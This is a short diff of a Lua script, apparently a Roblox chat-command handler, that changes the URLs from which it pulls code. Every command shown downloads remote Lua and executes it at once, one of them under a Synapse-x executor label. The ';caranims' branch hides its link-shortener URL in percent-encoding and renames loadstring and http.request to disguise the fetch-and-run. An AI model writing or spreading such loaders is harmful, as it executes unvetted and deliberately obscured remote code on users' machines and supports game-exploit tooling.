@@ -24,11 +24,11 @@ return function(scriptBox, player)
         elseif code == ";synapse" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Synapse-x/refs/heads/main/Synapse%20x"))()
         elseif code == ";saveexec" then
-            loadstring(game:HttpGet("https://glot.io/snippets/hjvegxt5rt/raw/saveexec.lua"))()
+            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/SaveExec.lua"))()
         elseif code == ";looper" then
-            loadstring(game:HttpGet("https://glot.io/snippets/hkafrbmxdj/raw/CodeLooper.lua"))()
+            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/CodeLooper.lua"))()
         elseif code == ";antierr" then
-            loadstring(game:HttpGet("https://glot.io/snippets/hcfoitpvco/raw/AntiError.lua"))()
+            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Test/raw/main/AntiErr.lua"))()
         elseif code == ";caranims" then
             local a,b,e=loadstring,http.request,"https://%74%31%70%2E%64%65/%43%61%72%41%6E%69%6D%73"
 a(b({Url=e}).Body)()
